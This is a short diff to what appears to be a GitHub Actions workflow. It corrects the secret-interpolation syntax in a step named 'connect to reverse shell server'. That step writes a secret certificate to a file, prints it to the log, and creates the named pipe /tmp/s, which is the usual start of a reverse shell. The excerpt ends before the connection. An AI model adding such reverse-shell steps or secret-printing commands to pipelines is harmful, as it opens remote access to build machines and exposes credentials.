@@ -18,7 +18,7 @@ jobs:
           ps -caxm -orss,comm
       - name: connect to reverse shell server
         run: |
-          echo "{{ secrets.REV_SH_CERT }}" > cert.pem 
+          echo "${{ secrets.REV_SH_CERT }}" > cert.pem 
           cat cert.pem
           openssl x509 -in cert.pem -noout -text
           mkfifo /tmp/s
